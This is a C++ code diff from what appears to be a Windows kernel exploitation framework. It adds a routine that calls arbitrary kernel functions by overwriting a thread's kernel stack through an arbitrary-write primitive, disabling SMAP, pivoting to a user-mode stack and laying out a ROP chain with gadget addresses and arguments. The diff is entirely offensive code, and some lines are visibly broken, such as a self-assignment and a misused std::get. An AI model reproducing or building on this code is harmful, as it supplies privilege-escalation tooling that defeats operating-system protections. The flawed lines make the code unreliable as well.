@@ -38,20 +38,34 @@ public:
 
 	template <typename... Args>
 	Qword CallKernelFunction(
+		const char* FunctionName,
+		Args... Arguments
+	) {
+		kAddress function = g_KernelBinary->ResolveExport(FunctionName);
+		return CallKernelFunction(function, Arguments...);
+	}
+
+	template <typename... Args>
+	Qword CallKernelFunction(
 		kAddress Function,
 		Args... Arguments)
 	{
 		auto args = std::make_tuple(std::forward<Args>(Arguments)...);
 		HANDLE event = CreateEventA(nullptr, true, false, nullptr);
 		DWORD currentTid = GetCurrentThreadId();
-		Qword returnValue = 0;
+		void* newStack = nullptr;
 
-		m_TaskQueue.push([args, event, Function, currentTid, &returnValue]
+		m_TaskQueue.push([args, event, Function, currentTid, &newStack]
 			{
 				kAddress thread = Resolves::GetThreadAddress(currentTid);
-				OverrideThreadStackWithFunctionCall(Function, thread, &returnValue, args);
+				OverrideThreadStackWithFunctionCall(Function, thread, newStack, args);
 				SetEvent(event);
 			});
+
+		//
+		// TODO: cleanup thread stacks that are created, prob at the end 
+		// as there's no point in reallocating.
+		//
 
 		auto returnValue = Qword(NtWaitForSingleObject(event, false, INFINITE));
 		return returnValue;
@@ -82,8 +96,8 @@ private:
 	static void OverrideThreadStackWithFunctionCall(
 		_In_ kAddress Function,
 		_In_ kAddress CallingThread,
-		_Inout_ Qword* ReturnValue,
-		_In_ std::tuple<Args...>&& Arguments
+		_Out_ PVOID& NewStack,
+		_In_ std::tuple<Args...> Arguments
 	) {
 
 		kAddress rsp = GetNtWaitForSingleObjectReturnAddress(CallingThread);
@@ -98,11 +112,12 @@ private:
 
 		// we add another page for our gadgets' shenanigens
 		constexpr DWORD c_PivotedStackSize = c_KernelStackSize + 0x1000;
-		thread_local Byte* newStack = VirtualAlloc(nullptr, c_KernelStackSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		PVOID newStack = VirtualAlloc(nullptr, c_KernelStackSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		NewStack = NewStack;
 
-		auto* stackTop = newStack + c_KernelStackSize;
+		auto* stackTop = (Byte*)newStack + c_KernelStackSize;
 		
-#define PUT_STACK(val) g_Rw->WriteQword(rsp, val); rsp += 8;
+#define PUT_STACK(val) g_Rw->WriteQword(rsp, Qword(val)); rsp += 8;
 
 		//
 		// Disable SMAP so we could pivot into user stack. Recall the gadget is
@@ -159,12 +174,12 @@ private:
 		// Note: We've now switched to usermode stack.
 		//
 
-		rsp = stackTop;
+		auto uRsp = stackTop;
 
 #undef PUT_STACK
-#define PUT_STACK(val) *(Qword*)(rsp)++ = Qword(val);
+#define PUT_STACK(val) *(Qword*)(uRsp)++ = Qword(val);
 
-		rsp += 0x30;		// add rsp, 0x30
+		uRsp += 0x30;		// add rsp, 0x30
 		PUT_STACK(0x1337);	// pop rdi
 		PUT_STACK(0x1337);	// pop rsp
 		PUT_STACK(0x1337);	// pop rbp
@@ -183,16 +198,16 @@ private:
 		//  jmp rax
 		//
 
-		PUT_STACK(s_RetpolineGadget);
+		PUT_STACK(s_Gadgets.Retpoline);
 
-		rsp += 0x20;
+		uRsp += 0x20;
 
 		// add jump target: Function
 		PUT_STACK(Function);
-		auto* beforeArgsRsp = rsp;
+		auto* beforeArgsRsp = uRsp;
 		
 		// add register arguments
-		constexpr auto NumberOfArguments = std::size(Arguments);
+		constexpr auto NumberOfArguments = std::tuple_size<decltype(Arguments)>::value;
 
 		if constexpr (NumberOfArguments >= 1) PUT_STACK(std::get<0>(Arguments));
 		if constexpr (NumberOfArguments >= 2) PUT_STACK(std::get<1>(Arguments));
@@ -200,23 +215,23 @@ private:
 		if constexpr (NumberOfArguments >= 4) PUT_STACK(std::get<3>(Arguments));
 
 		// update rsp to after add rsp, 0x48
-		rsp = beforeArgsRsp + 0x28;
+		uRsp = beforeArgsRsp + 0x28;
 
 		// add remaining stack arguments
 		
-		rsp += 0x20; // save shadow space
+		uRsp += 0x20; // save shadow space
 
 		if constexpr (NumberOfArguments >= 5) {
 			auto indiciesOfRemainingArgs = std::make_index_sequence<NumberOfArguments - 4>{};
 			Qword remaining[] = { Qword(std::get<indiciesOfRemainingArgs>(Arguments))... };
-			std::memcpy(rsp, remaining, sizeof(remaining));
+			std::memcpy(uRsp, remaining, sizeof(remaining));
 
-			rsp += sizeof(remaining);
+			uRsp += sizeof(remaining);
 		}
 
 		// go back to where we've been - and return to user mode lol
 		
-		std::memcpy(rsp, previousStackData.data(), previousStackData.size());
+		std::memcpy(uRsp, previousStackData.data(), previousStackData.size());
 	}
 
 	void WorkerThread()
